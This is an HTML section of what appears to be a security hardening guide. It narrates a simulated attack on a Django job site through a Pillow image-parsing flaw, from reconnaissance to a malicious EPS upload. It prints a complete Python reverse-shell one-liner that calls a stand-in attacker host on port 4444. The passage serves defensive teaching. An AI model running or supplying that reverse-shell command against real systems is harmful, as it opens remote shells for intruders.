            <section class="section-block" id="s34-1">
                <h3 class="section-h">34.1 Simulated Attack Scenario — easypj Under Attack</h3>
                <p>The attacker's entry point is <strong>CVE-2023-50447</strong> — an arbitrary code execution vulnerability in Pillow (Python Imaging Library) versions &lt; 10.0.1. The easypj image bundles Pillow 9.4.0 for processing job posting images. The attacker discovered this via a <code>nmap</code> scan of the public ingress endpoint, fingerprinting the <code>Server: gunicorn</code> header and probing the Django debug page for library versions.</p>

                <div class="scenario-box">
                    <div class="scenario-header">
                        <span class="scenario-badge danger">ATTACK NARRATIVE</span>
                        <span class="scenario-title">T+0:00 — Initial Compromise Through Pillow CVE</span>
                    </div>
                    <div class="scenario-steps">
                        <div class="scenario-step"><div class="step-marker">1</div><div class="step-content"><strong>Reconnaissance (T-2 hours)</strong><p>Attacker scans <code>jobs.easypj.com</code>. Response headers reveal <code>Server: gunicorn/22.0.0</code> — confirming Python/Django stack. The job posting image upload endpoint at <code>/api/jobs/upload-image/</code> accepts user-uploaded images — the Pillow attack surface.</p></div></div>
                        <div class="scenario-step"><div class="step-marker">2</div><div class="step-content"><strong>Exploitation (T+0:00)</strong><p>Attacker crafts a malicious EPS image with an embedded <code>os.system()</code> payload. When uploaded through the job posting form, Pillow attempts to parse it. The CVE triggers, executing the attacker's command: <code>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("198.51.100.23",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'</code></p></div></div>
                        <div class="scenario-step"><div class="step-marker">3</div><div class="step-content"><strong>Shell Access Acquired (T+0:01)</strong><p>Reverse shell connects to attacker's C2 server at 198.51.100.23:4444. Attacker now has an interactive bash shell inside the easypj container. They run as UID 1000 (the Django user) — <strong>not root, thanks to Ch33 hardening!</strong></p></div></div>
                    </div>
                </div>

